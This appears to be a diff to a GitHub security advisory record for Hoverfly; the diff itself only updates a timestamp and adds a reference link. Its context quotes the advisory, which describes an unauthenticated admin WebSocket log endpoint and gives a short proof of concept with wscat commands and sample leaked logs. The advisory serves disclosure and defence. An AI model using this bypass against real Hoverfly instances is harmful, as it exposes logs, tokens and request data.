@@ -40,7 +40,7 @@
   },
   "details": "### Summary\nHoverfly\u2019s admin WebSocket endpoint /api/v2/ws/logs is not protected by the same authentication middleware that guards the REST admin API.\nConsequently, an unauthenticated remote attacker can:\n\n- Stream real-time application logs (information disclosure).\n- Gain insight into internal file paths, request/response bodies, and other potentially sensitive data emitted in logs.\n\n### PoC\n1. Start Hoverfly with authentication enabled:\n\n```\n./hoverfly -auth\n```\n\n2. Confirm REST API requires credentials:\n\n```\ncurl -i http://localhost:8888/api/v2/hoverfly/version\n```\n\n3. Connect to the WebSocket endpoint without credentials:\n\n\n```\nwscat -c ws://localhost:8888/api/v2/ws/logs\n# Connected (press CTRL+C to quit)\n# \u2026 logs stream immediately \u2026 (You would need to send a message to start receiving stream)\n```\n\n```\nwscat -c ws://localhost:8888/api/v2/ws/logs\nConnected (press CTRL+C to quit)\n> hi!\n< {\"logs\":[{\"level\":\"info\",\"msg\":\"Log level set to verbose\",\"time\":\"2025-07-20T17:07:00+05:30\"},{\"level\":\"info\",\"msg\":\"Using memory backend\",\"time\":\"2025-07-20T17:07:00+05:30\"},{\"level\":\"info\",\"msg\":\"User added successfully\",\"time\":\"2025-07-20T17:07:00+05:30\",\"username\":\"\"},{\"level\":\"info\",\"msg\":\"Enabling proxy authentication\",\"time\":\"2025-07-20T17:07:00+05:30\"},{\"Destination\":\".\",\"Mode\":\"simulate\",\"ProxyPort\":\"8500\",\"level\":\"info\",\"msg\":\"Proxy prepared...\",\"time\":\"2025-07-20T17:07:00+05:30\"},{\"destination\":\".\",\"level\":\"info\",\"mode\":\"simulate\",\"msg\":\"current proxy configuration\",\"port\":\"8500\",\"time\":\"2025-07-20T17:07:00+05:30\"},{\"level\":\"info\",\"msg\":\"serving proxy\",\"time\":\"2025-07-20T17:07:00+05:30\"},{\"AdminPort\":\"8888\",\"level\":\"info\",\"msg\":\"Admin interface is starting...\",\"time\":\"2025-07-20T17:07:00+05:30\"},{\"level\":\"debug\",\"message\":\"hi!\",\"msg\":\"Got message...\",\"time\":\"2025-07-20T17:09:04+05:30\"}]}\n< ...\n< ...\n```\n\n### Impact\nAuthentication bypass; an attacker receives full application logs, including proxied request/response bodies, tokens, file paths, etc.",
   "id": "GHSA-jxmr-2h4q-rhxp",
-  "modified": "2025-09-17T17:42:18.256726Z",
+  "modified": "2025-09-24T21:14:07Z",
   "published": "2025-09-10T20:43:49Z",
   "references": [
     {
@@ -58,6 +58,10 @@
     {
       "type": "PACKAGE",
       "url": "https://github.com/SpectoLabs/hoverfly"
+    },
+    {
+      "type": "WEB",
+      "url": "https://pkg.go.dev/vuln/GO-2025-3945"
     }
   ],
   "schema_version": "1.7.3",
